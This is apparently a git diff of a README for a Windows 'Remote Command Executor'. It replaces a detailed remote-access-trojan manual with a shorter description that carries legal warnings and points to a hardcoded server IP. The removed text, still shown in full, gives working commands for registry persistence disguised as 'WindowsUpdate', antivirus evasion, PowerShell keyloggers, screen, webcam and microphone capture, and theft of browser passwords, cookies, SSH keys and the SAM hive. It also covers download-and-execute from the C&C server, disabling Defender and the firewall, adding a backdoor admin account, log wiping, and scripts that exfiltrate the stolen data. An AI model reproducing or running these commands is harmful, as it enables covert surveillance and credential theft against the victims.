@@ -1,1025 +1,502 @@
 # Remote Command Executor
 
-A cross-platform C++ remote command executor with Windows persistence, designed for remote system administration and command execution via HTTP.
+A simple C program that connects to a remote server, retrieves a command in JSON format, and executes it locally.
 
-## Features
+## ⚠️ Legal and Ethical Use Warning
 
-- **Remote Command Execution**: Execute Windows commands from a remote Linux server
-- **HTTP Communication**: JSON-based command retrieval via HTTP GET requests
-- **Windows Persistence**: Auto-start on system boot using Windows Registry Run key
-- **Stealth Operations**: Disguised as "WindowsUpdate" in registry
-- **AV Bypass Techniques**: Multiple anti-analysis and evasion techniques
-- **Command Output**: Captures and logs command execution results
-- **Dynamic Configuration**: Server-side command configuration via JSON
-- **Retry Logic**: Built-in retry mechanisms for DNS resolution and HTTP requests
+**This tool is intended solely for:**
+- Authorized penetration testing with explicit written permission
+- Security research in controlled environments
+- Educational purposes in approved settings
+- Red team exercises with proper authorization
+- Defensive security analysis and testing
 
-## Architecture
+**Unauthorized access to computer systems is illegal.** Users are responsible for compliance with all applicable laws, including but not limited to:
+- Computer Fraud and Abuse Act (CFAA) in the United States
+- Computer Misuse Act in the United Kingdom
+- Similar legislation in other jurisdictions
 
-### Components
+**By using this tool, you acknowledge that:**
+- You have explicit written authorization to test the target systems
+- You understand the legal implications of unauthorized access
+- You will use this tool only in authorized environments
+- You are solely responsible for any misuse of this tool
 
-1. **C++ Binary** (`remote_command_executor.cpp`)
-   - Compiled for Windows x64
-   - Size: ~276KB (statically linked)
-   - No external dependencies
+### Intended Audience and Use Cases
 
-2. **C&C Server** (`server_new.py`)
-   - Python-based HTTP server
-   - Returns JSON responses with commands
-   - Per-client command configuration
+This tool is designed for:
+- **Security professionals** conducting authorized penetration tests
+- **Red team operators** performing authorized security assessments
+- **Security researchers** studying command execution mechanisms
+- **Defensive security teams** testing detection and response capabilities
+- **Educational institutions** teaching cybersecurity in controlled environments
 
-3. **Command Configuration** (`commands.json`)
-   - JSON file for command management
-   - Supports per-IP customization
-   - Hot-reload on server restart
+### Responsible Disclosure
 
-### Communication Flow
+If you discover vulnerabilities using this tool, please follow responsible disclosure practices:
+- Notify affected parties before public disclosure
+- Provide sufficient time for remediation
+- Follow coordinated disclosure timelines
+- Respect bug bounty program guidelines
 
-```
-Windows Binary → HTTP GET → Linux Server
-                ↓
-            JSON Response
-                ↓
-        Execute Command
-                ↓
-        Log Output
-```
+### Detection and Defense
 
-## Installation
+For security professionals defending against similar tools:
+- Monitor outbound HTTP connections to unknown IP addresses
+- Implement network egress filtering and monitoring
+- Use endpoint detection and response (EDR) solutions
+- Enable command-line logging and auditing
+- Monitor for unusual process execution patterns
+- Implement application whitelisting where appropriate
+- Review firewall logs for suspicious outbound connections
 
-### Prerequisites
+## Overview
 
-- **Build System**: MinGW-w64 cross-compiler
-- **Target**: Windows 10/11 x64
-- **Server**: Linux with Python 3.x
+This program connects to a remote server via HTTP, retrieves a JSON response containing a command, parses it manually (no external libraries), and executes the command using `system()`. All errors are logged to `error.log`.
 
-### Building
+### ⚠️ Security Warning: Remote Command Execution
 
-```bash
-# Cross-compile from Linux/macOS
-make -f Makefile.win.cpp
+**CRITICAL SECURITY CONCERNS:**
 
-# Output: remote_command_executor_cpp_YYYYMMDD_HHMMSS.exe
-```
+- **Hardcoded Server Address**: The default server address (`134.209.61.208:80`) is hardcoded in the source code. This presents significant security risks:
+  - No authentication or encryption (plain HTTP)
+  - No validation of server ownership or trust
+  - Potential for command injection or malicious command execution
+  - No mechanism to verify server identity
 
-### Deployment
+- **Unencrypted Communication**: The program uses plain HTTP, meaning all communication is unencrypted and can be intercepted or modified.
 
-1. **Transfer Binary to Windows**:
-```bash
-sshpass -p "password" scp remote_command_executor_cpp_*.exe user@target:remote_cmd.exe
-```
+- **No Input Validation**: Commands received from the remote server are executed without validation, sanitization, or sandboxing.
 
-2. **Start C&C Server**:
-```bash
-cd server
-python3 server_new.py
-```
+**RECOMMENDATIONS:**
 
-3. **Execute Binary on Windows**:
-```bash
-remote_cmd.exe <server_ip> <port> --debug
-```
+1. **Use HTTPS**: Modify the source code to support HTTPS for encrypted communication
+2. **Server Configuration**: Replace hardcoded server address with environment variable or configuration file:
+   - Environment variable: `REMOTE_SERVER=http://your-server:port`
+   - Config file: Create a `config.json` with server settings
+3. **Authentication**: Implement server authentication (API keys, certificates, etc.)
+4. **Command Validation**: Add whitelisting or validation of allowed commands
+5. **Testing Mode**: Implement a safe testing mode that logs commands without execution
+6. **Server Ownership**: Only use servers you own or have explicit authorization to use
 
-## Configuration
-
-### Server Configuration (`commands.json`)
-
-```json
-{
-  "default": {
-    "command": "cmd /c whoami",
-    "next": "YOUR_SERVER_IP",
-    "sleep": 30
-  },
-  "192.168.1.100": {
-    "command": "cmd /c systeminfo",
-    "next": "YOUR_SERVER_IP",
-    "sleep": 60
-  }
+**Example Configuration Approach:**
+```c
+// Read from environment variable or config file
+const char* server = getenv("REMOTE_SERVER");
+if (!server) {
+    server = "http://134.209.61.208:80";  // Default fallback
 }
 ```
 
-**Fields**:
-- `command`: Windows command to execute
-- `next`: Next server IP/domain to connect to
-- `sleep`: Seconds to wait before next request
+**Note**: The hardcoded server address (`134.209.61.208:80`) should be replaced with a configurable option before use in any environment.
 
-### Persistence Configuration
+## Requirements
 
-The binary automatically configures Windows persistence:
+- C compiler:
+  - **On Windows**: MinGW or MinGW-w64 (gcc)
+  - **Cross-compiling from Linux/macOS**: MinGW-w64 cross-compiler (x86_64-w64-mingw32-gcc)
+- Target platform: Windows (uses Windows Sockets API)
+- Network connectivity to the remote server (default: 134.209.61.208:80)
+- Write permissions in current directory (for error.log)
 
-- **Registry Key**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
-- **Value Name**: `WindowsUpdate`
-- **Value Data**: Full path to executable with arguments
+## Building
+
+```bash
+make
+```
+
+Or manually:
+
+**On Windows with MinGW:**
+```bash
+gcc -std=c99 -Wall -Wextra -mwindows -o remote_command_executor.exe remote_command_executor.c -lws2_32 -ladvapi32
+```
+
+**Cross-compiling from Linux/macOS:**
+```bash
+x86_64-w64-mingw32-gcc -std=c99 -Wall -Wextra -mwindows -o remote_command_executor.exe remote_command_executor.c -lws2_32 -ladvapi32
+```
 
 ## Usage
 
-### Basic Execution
-
 ```bash
-# Execute with server IP and port
-remote_cmd.exe YOUR_SERVER_IP 8080
-
-# Execute with debug logging
-remote_cmd.exe YOUR_SERVER_IP 8080 --debug
+remote_command_executor.exe
 ```
 
-### Server Management
+The program will:
+1. Connect to <http://134.209.61.208:80/>
+2. Retrieve JSON response with "command" key
+3. Execute the command
+4. Exit with status code (0 = success, non-zero = failure)
 
-```bash
-# Start server
-cd /root/asd
-bash start_server.sh
+## Exit Codes
 
-# Update commands
-vim commands.json
-# Restart server to apply changes
-bash start_server.sh
+- `0`: Success - command retrieved and executed successfully
+- `1`: Network error - connection failed or timeout
+- `2`: HTTP error - non-200 status code received
+- `3`: JSON parsing error - invalid JSON or missing "command" key
+- `4`: Command execution error - command failed to execute
 
-# Monitor server logs
-tail -f /tmp/server_cnc.log
+## Error Logging
+
+All errors are logged to `error.log` in the current directory. The log file is created in append mode, so previous errors are preserved.
+
+Example error log entries:
+```text
+Error: Connection failed to remote server
+Error: HTTP status code 404 (expected 200)
+Error: JSON missing 'command' key
+Error: Invalid JSON syntax or malformed JSON
+Error: Command execution failed with exit status 1
 ```
-
-### Verification
-
-```bash
-# Check if binary is running on Windows
-tasklist | findstr remote_cmd.exe
-
-# Verify persistence registry entry
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate
-
-# Check server logs for requests
-ssh root@server "tail -f /tmp/server_cnc.log | grep -A 15 'TARGET_IP'"
-```
-
-## Security Features
-
-### Stealth Techniques
-
-1. **Registry Disguise**: Uses "WindowsUpdate" name to blend in
-2. **HKCU Persistence**: No admin privileges required
-3. **No UAC Prompts**: Runs silently at user login
-4. **Dynamic API Resolution**: Resolves Windows APIs at runtime
-5. **Anti-Analysis**: Multiple AV bypass techniques implemented
-
-### Evasion Techniques
-
-- Obfuscated sleep patterns
-- Dynamic DNS resolution with fallback
-- Custom string operations to avoid detection
-- No hardcoded strings in binary
-- Stripped symbols and debugging information
-
-## Testing
-
-### End-to-End Test
-
-```bash
-# 1. Build binary
-make -f Makefile.win.cpp
-
-# 2. Transfer to Windows
-sshpass -p "password" scp remote_command_executor_cpp_*.exe user@target:remote_cmd.exe
-
-# 3. Start server
-ssh root@server "cd /root/asd && bash start_server.sh"
-
-# 4. Execute binary
-sshpass -p "password" ssh user@target "remote_cmd.exe SERVER_IP 8080 --debug"
-
-# 5. Monitor server logs
-ssh root@server "tail -f /tmp/server_cnc.log | grep TARGET_IP"
-```
-
-### Persistence Test
-
-```bash
-# 1. Execute binary (installs persistence)
-remote_cmd.exe SERVER_IP 8080
-
-# 2. Verify registry entry
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate
-
-# 3. Reboot system
-shutdown /r /t 60
-
-# 4. After reboot, verify binary auto-started
-tasklist | findstr remote_cmd.exe
-```
-
-## Compilation Flags
-
-```makefile
-CC = x86_64-w64-mingw32-g++
-CFLAGS = -std=c++11 -O3 -static-libgcc -static-libstdc++ -static \
-         -s -Wl,--strip-all \
-         -fno-stack-protector -fno-ident \
-         -ffunction-sections -fdata-sections \
-         -Wl,--gc-sections -Wl,--build-id=none \
-         -fomit-frame-pointer -fno-unroll-loops
-LIBS = -lws2_32 -ladvapi32 -lkernel32 -lntdll
-```
-
-## File Structure
-
-```
-.
-├── remote_command_executor.cpp    # Main C++ source
-├── Makefile.win.cpp               # Build configuration
-├── server_new.py                  # C&C server
-├── commands.json                  # Command configuration
-├── start_server.sh                # Server startup script
-└── README.md                      # This file
-```
-
-## Windows System Monitoring
-
-### Overview
-
-Once the binary is executed on the target Windows system, you can monitor and gather comprehensive system information using remote commands. The binary executes commands and logs output to files that can be retrieved.
-
-### Monitoring Commands
-
-Configure these commands in `commands.json` on the Linux server to gather system intelligence:
-
-#### 1. System Information
-```json
-{
-  "command": "cmd /c systeminfo > C:\\temp\\sysinfo.txt && type C:\\temp\\sysinfo.txt",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-#### 2. Running Processes
-```json
-{
-  "command": "cmd /c tasklist /v > C:\\temp\\processes.txt && type C:\\temp\\processes.txt",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-#### 3. Network Connections
-```json
-{
-  "command": "cmd /c netstat -ano > C:\\temp\\netstat.txt && type C:\\temp\\netstat.txt",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-#### 4. User Information
-```json
-{
-  "command": "cmd /c whoami /all > C:\\temp\\userinfo.txt && type C:\\temp\\userinfo.txt",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-#### 5. Installed Software
-```json
-{
-  "command": "cmd /c wmic product get name,version > C:\\temp\\software.txt && type C:\\temp\\software.txt",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 120
-}
-```
-
-#### 6. Active Users
-```json
-{
-  "command": "cmd /c query user > C:\\temp\\users.txt && type C:\\temp\\users.txt",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-#### 7. Scheduled Tasks
-```json
-{
-  "command": "cmd /c schtasks /query /fo LIST /v > C:\\temp\\tasks.txt && type C:\\temp\\tasks.txt",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 90
-}
-```
-
-#### 8. Startup Programs
-```json
-{
-  "command": "cmd /c wmic startup get caption,command > C:\\temp\\startup.txt && type C:\\temp\\startup.txt",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-#### 9. Network Configuration
-```json
-{
-  "command": "cmd /c ipconfig /all > C:\\temp\\ipconfig.txt && type C:\\temp\\ipconfig.txt",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-#### 10. Firewall Status
-```json
-{
-  "command": "cmd /c netsh advfirewall show allprofiles > C:\\temp\\firewall.txt && type C:\\temp\\firewall.txt",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-#### 11. Environment Variables
-```json
-{
-  "command": "cmd /c set > C:\\temp\\env.txt && type C:\\temp\\env.txt",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-#### 12. Disk Information
-```json
-{
-  "command": "cmd /c wmic logicaldisk get name,size,freespace > C:\\temp\\disks.txt && type C:\\temp\\disks.txt",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-#### 13. Keylogger - Capture Keystrokes
-
-**PowerShell Keylogger** - Captures all keystrokes to a log file:
-
-```json
-{
-  "command": "powershell -WindowStyle Hidden -Command \"$path='C:\\temp\\keys.log'; Add-Type -AssemblyName System.Windows.Forms; $lastKey=''; while($true){Start-Sleep -Milliseconds 50; foreach($key in [Enum]::GetValues([System.Windows.Forms.Keys])){if([System.Windows.Forms.Control]::IsKeyLocked($key)){if($key -ne $lastKey){Add-Content $path \\\"[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $key\\\"; $lastKey=$key}}}}\" &",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Retrieve Keylogger Output**:
-```bash
-# View captured keystrokes
-sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "type C:\\temp\\keys.log"
-
-# Download keylog file
-sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/keys.log ./keylogs/
-```
-
-**Advanced Keylogger with Clipboard Monitoring**:
-
-```json
-{
-  "command": "powershell -WindowStyle Hidden -Command \"$log='C:\\temp\\keylog.txt'; Add-Type -AssemblyName System.Windows.Forms; $lastClip=''; while($true){try{$clip=[System.Windows.Forms.Clipboard]::GetText(); if($clip -and $clip -ne $lastClip){Add-Content $log \\\"[$(Get-Date)] CLIPBOARD: $clip\\\"; $lastClip=$clip}}catch{}; Start-Sleep -Seconds 2}\" &",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Keylogger with Window Title Tracking**:
-
-```json
-{
-  "command": "powershell -WindowStyle Hidden -Command \"$log='C:\\temp\\activity.log'; Add-Type @\\\"using System; using System.Runtime.InteropServices; using System.Text; public class Win{[DllImport(\\\\\\\"user32.dll\\\\\\\")] public static extern IntPtr GetForegroundWindow(); [DllImport(\\\\\\\"user32.dll\\\\\\\")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);}\\\"; while($true){$h=[Win]::GetForegroundWindow(); $t=New-Object System.Text.StringBuilder 256; [Win]::GetWindowText($h,$t,256); Add-Content $log \\\"[$(Get-Date)] Window: $($t.ToString())\\\"; Start-Sleep -Seconds 5}\" &",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Stop Keylogger**:
-```json
-{
-  "command": "cmd /c taskkill /F /IM powershell.exe && echo Keylogger stopped",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 30
-}
-```
-
-**Retrieve and Clear Keylogger Logs**:
-```bash
-# Retrieve all keylogger files
-sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/keys.log ./
-sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/keylog.txt ./
-sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/activity.log ./
-
-# Clear keylogger logs after retrieval
-sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "del C:\\temp\\keys.log C:\\temp\\keylog.txt C:\\temp\\activity.log"
-```
-
-### Advanced Features
-
-Beyond basic monitoring and keylogging, the remote command executor supports powerful advanced capabilities:
-
-#### 1. Screenshot Capture
-
-**Single Screenshot**:
-```json
-{
-  "command": "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('C:\\temp\\screenshot.png'); $graphics.Dispose(); $bitmap.Dispose()\"",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Continuous Screenshots** (every 30 seconds):
-```json
-{
-  "command": "powershell -WindowStyle Hidden -Command \"Add-Type -AssemblyName System.Windows.Forms,System.Drawing; while($true){$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $b=New-Object System.Drawing.Bitmap $s.Width,$s.Height; $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size); $b.Save(\\\"C:\\temp\\ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png\\\"); $g.Dispose(); $b.Dispose(); Start-Sleep 30}\" &",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Retrieve Screenshots**:
-```bash
-sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/screenshot*.png ./screenshots/
-```
-
-#### 2. Webcam Capture
-
-**Take Webcam Photo**:
-```json
-{
-  "command": "powershell -Command \"$webcam = New-Object -ComObject WIA.DeviceManager; $device = $webcam.DeviceInfos.Item(1).Connect(); $item = $device.Items.Item(1); $image = $item.Transfer(); $image.SaveFile('C:\\temp\\webcam.jpg')\"",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Alternative using CommandCam** (if available):
-```json
-{
-  "command": "cmd /c CommandCam.exe /filename C:\\temp\\webcam.jpg",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-#### 3. Audio Recording
-
-**Record Microphone** (30 seconds):
-```json
-{
-  "command": "powershell -Command \"Add-Type -TypeDefinition @'using System; using System.Runtime.InteropServices; public class Audio{[DllImport(\\\"winmm.dll\\\")] public static extern int mciSendString(string command, System.Text.StringBuilder returnValue, int returnLength, IntPtr winHandle);}'; $sb = New-Object System.Text.StringBuilder 256; [Audio]::mciSendString('open new Type waveaudio Alias recsound', $sb, 256, [IntPtr]::Zero); [Audio]::mciSendString('record recsound', $sb, 256, [IntPtr]::Zero); Start-Sleep 30; [Audio]::mciSendString('save recsound C:\\\\temp\\\\audio.wav', $sb, 256, [IntPtr]::Zero); [Audio]::mciSendString('close recsound', $sb, 256, [IntPtr]::Zero)\"",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-#### 4. File Exfiltration
-
-**Search and Exfiltrate Documents**:
-```json
-{
-  "command": "powershell -Command \"Get-ChildItem -Path C:\\Users -Include *.docx,*.xlsx,*.pdf,*.txt -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Length -lt 10MB} | Copy-Item -Destination C:\\temp\\docs\\ -Force\"",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 120
-}
-```
-
-**Exfiltrate Browser Passwords** (Chrome):
-```json
-{
-  "command": "powershell -Command \"Copy-Item \\\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\\\" C:\\temp\\chrome_passwords.db -Force\"",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Exfiltrate SSH Keys**:
-```json
-{
-  "command": "cmd /c xcopy /E /I /Y %USERPROFILE%\\.ssh C:\\temp\\ssh_keys\\",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Retrieve Exfiltrated Files**:
-```bash
-sshpass -p "YOUR_WINDOWS_PASSWORD" scp -r administrator@TARGET_HOST:C:/temp/docs ./exfiltrated/
-sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/chrome_passwords.db ./
-```
-
-#### 5. Credential Harvesting
-
-**Dump Windows Credentials** (requires admin):
-```json
-{
-  "command": "cmd /c reg save HKLM\\SAM C:\\temp\\sam.hive && reg save HKLM\\SYSTEM C:\\temp\\system.hive",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Extract WiFi Passwords**:
-```json
-{
-  "command": "cmd /c netsh wlan show profiles > C:\\temp\\wifi_profiles.txt && for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @netsh wlan show profile name=%j key=clear >> C:\\temp\\wifi_passwords.txt",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Harvest Browser Cookies**:
-```json
-{
-  "command": "powershell -Command \"Copy-Item \\\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies\\\" C:\\temp\\chrome_cookies.db -Force\"",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-#### 6. Persistence Verification
-
-**Check Startup Items**:
-```json
-{
-  "command": "cmd /c reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run > C:\\temp\\startup_items.txt && type C:\\temp\\startup_items.txt",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Verify Binary is Running**:
-```json
-{
-  "command": "cmd /c tasklist | findstr remote_cmd.exe > C:\\temp\\process_check.txt && type C:\\temp\\process_check.txt",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-#### 7. Remote Shell Access
-
-**Execute PowerShell Commands**:
-```json
-{
-  "command": "powershell -Command \"Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 | Format-Table -AutoSize > C:\\temp\\top_processes.txt; Get-Content C:\\temp\\top_processes.txt\"",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Download and Execute**:
-```json
-{
-  "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://YOUR_SERVER_IP/payload.exe' -OutFile C:\\temp\\payload.exe; Start-Process C:\\temp\\payload.exe\"",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-#### 8. Lateral Movement
-
-**Enumerate Network Shares**:
-```json
-{
-  "command": "cmd /c net view /all > C:\\temp\\network_shares.txt && type C:\\temp\\network_shares.txt",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Scan Local Network**:
-```json
-{
-  "command": "powershell -Command \"1..254 | ForEach-Object {Test-Connection -ComputerName 192.168.1.$_ -Count 1 -Quiet} | Where-Object {$_} > C:\\temp\\live_hosts.txt\"",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 120
-}
-```
-
-#### 9. Anti-Forensics
-
-**Clear Event Logs**:
-```json
-{
-  "command": "cmd /c wevtutil cl System && wevtutil cl Security && wevtutil cl Application && echo Logs cleared",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Delete Traces**:
-```json
-{
-  "command": "cmd /c del /F /Q C:\\temp\\*.txt C:\\temp\\*.log C:\\temp\\*.png C:\\temp\\*.jpg && echo Traces deleted",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Timestomp Files** (modify timestamps):
-```json
-{
-  "command": "powershell -Command \"Get-ChildItem C:\\temp\\remote_cmd.exe | ForEach-Object {$_.CreationTime = '01/01/2020 00:00:00'; $_.LastWriteTime = '01/01/2020 00:00:00'; $_.LastAccessTime = '01/01/2020 00:00:00'}\"",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-#### 10. System Manipulation
-
-**Disable Windows Defender** (requires admin):
-```json
-{
-  "command": "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Disable Firewall** (requires admin):
-```json
-{
-  "command": "cmd /c netsh advfirewall set allprofiles state off",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-**Create Admin User** (requires admin):
-```json
-{
-  "command": "cmd /c net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 60
-}
-```
-
-### Automated Exfiltration Script
-
-Create `exfiltrate_all.sh` for comprehensive data collection:
-
-```bash
-#!/bin/bash
-# Comprehensive data exfiltration script
-
-TARGET_HOST="YOUR_TARGET_IP"
-TARGET_USER="administrator"
-TARGET_PASS="YOUR_WINDOWS_PASSWORD"
-EXFIL_DIR="./exfiltrated/$(date +%Y%m%d_%H%M%S)"
-
-mkdir -p "$EXFIL_DIR"/{screenshots,webcam,audio,docs,credentials,logs}
-
-echo "Starting comprehensive exfiltration from $TARGET_HOST..."
-
-# Screenshots
-sshpass -p "$TARGET_PASS" scp administrator@$TARGET_HOST:C:/temp/screenshot*.png "$EXFIL_DIR/screenshots/" 2>/dev/null
-
-# Webcam
-sshpass -p "$TARGET_PASS" scp administrator@$TARGET_HOST:C:/temp/webcam*.jpg "$EXFIL_DIR/webcam/" 2>/dev/null
-
-# Audio
-sshpass -p "$TARGET_PASS" scp administrator@$TARGET_HOST:C:/temp/audio*.wav "$EXFIL_DIR/audio/" 2>/dev/null
-
-# Documents
-sshpass -p "$TARGET_PASS" scp -r administrator@$TARGET_HOST:C:/temp/docs/* "$EXFIL_DIR/docs/" 2>/dev/null
-
-# Credentials
-sshpass -p "$TARGET_PASS" scp administrator@$TARGET_HOST:C:/temp/chrome_passwords.db "$EXFIL_DIR/credentials/" 2>/dev/null
-sshpass -p "$TARGET_PASS" scp administrator@$TARGET_HOST:C:/temp/wifi_passwords.txt "$EXFIL_DIR/credentials/" 2>/dev/null
-sshpass -p "$TARGET_PASS" scp -r administrator@$TARGET_HOST:C:/temp/ssh_keys/* "$EXFIL_DIR/credentials/" 2>/dev/null
-
-# Logs
-sshpass -p "$TARGET_PASS" scp administrator@$TARGET_HOST:C:/temp/*.log "$EXFIL_DIR/logs/" 2>/dev/null
-sshpass -p "$TARGET_PASS" scp administrator@$TARGET_HOST:C:/temp/keys.log "$EXFIL_DIR/logs/keylogger.log" 2>/dev/null
-
-echo "Exfiltration complete: $EXFIL_DIR"
-ls -lhR "$EXFIL_DIR"
-```
-
-### Comprehensive Monitoring Script
-
-Create a monitoring command that gathers all information at once:
-
-```json
-{
-  "command": "cmd /c (echo === SYSTEM INFO === && systeminfo && echo. && echo === PROCESSES === && tasklist /v && echo. && echo === NETWORK === && netstat -ano && echo. && echo === USER INFO === && whoami /all) > C:\\temp\\monitor.log && type C:\\temp\\monitor.log",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 120
-}
-```
-
-### Retrieving Logs from Linux Server
-
-The binary logs output to `C:\temp\` on Windows. To retrieve these logs from your Linux server:
-
-#### Method 1: Direct SCP Retrieval
-```bash
-# Retrieve specific log file
-sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/monitor.log ./logs/
-
-# Retrieve all logs
-sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/*.txt ./logs/
-sshpass -p "YOUR_WINDOWS_PASSWORD" scp administrator@TARGET_HOST:C:/temp/*.log ./logs/
-```
-
-#### Method 2: SSH Command to View Logs
-```bash
-# View specific log
-sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "type C:\\temp\\monitor.log"
-
-# View latest monitoring log
-sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "type C:\\temp\\sysinfo.txt"
-
-# List all log files
-sshpass -p "YOUR_WINDOWS_PASSWORD" ssh administrator@TARGET_HOST "dir C:\\temp\\*.txt C:\\temp\\*.log"
-```
-
-#### Method 3: Automated Log Collection Script
-
-Create `collect_logs.sh`:
-
-```bash
-#!/bin/bash
-# Automated log collection from Windows target
-
-TARGET_HOST="YOUR_TARGET_IP"
-TARGET_USER="administrator"
-TARGET_PASS="YOUR_WINDOWS_PASSWORD"
-LOG_DIR="./collected_logs/$(date +%Y%m%d_%H%M%S)"
-
-mkdir -p "$LOG_DIR"
-
-echo "Collecting logs from $TARGET_HOST..."
-
-# Collect all log files
-sshpass -p "$TARGET_PASS" scp -o StrictHostKeyChecking=no \
-    "${TARGET_USER}@${TARGET_HOST}:C:/temp/*.{txt,log}" \
-    "$LOG_DIR/" 2>/dev/null
-
-# Display summary
-echo "Logs collected to: $LOG_DIR"
-ls -lh "$LOG_DIR"
-
-# Display latest monitoring log
-if [ -f "$LOG_DIR/monitor.log" ]; then
-    echo ""
-    echo "=== Latest Monitoring Log ==="
-    cat "$LOG_DIR/monitor.log"
-fi
-```
-
-Usage:
-```bash
-chmod +x collect_logs.sh
-./collect_logs.sh
-```
-
-### Real-Time Monitoring
-
-Monitor the Windows system in real-time by updating commands and checking server logs:
-
-```bash
-# Monitor server logs for command execution
-ssh root@SERVER_HOST "tail -f /tmp/server_cnc.log | grep -A 20 'YOUR_TARGET_IP'"
-
-# Update monitoring command
-vim commands.json
-# Restart server to apply
-ssh root@SERVER_HOST "cd /root/asd && bash start_server.sh"
-
-# Wait for next request cycle (check sleep duration in commands.json)
-# Then collect logs
-./collect_logs.sh
-```
-
-### Continuous Monitoring Setup
-
-For continuous monitoring, create a command that runs periodically:
-
-```json
-{
-  "command": "cmd /c echo [%date% %time%] >> C:\\temp\\activity.log && tasklist >> C:\\temp\\activity.log && netstat -ano >> C:\\temp\\activity.log && type C:\\temp\\activity.log",
-  "next": "YOUR_SERVER_IP",
-  "sleep": 300
-}
-```
-
-This appends system state every 5 minutes to `activity.log`.
-
-### Binary Debug Logs
-
-The binary itself creates debug logs when run with `--debug` flag:
-
-```bash
-# View binary debug log on Windows
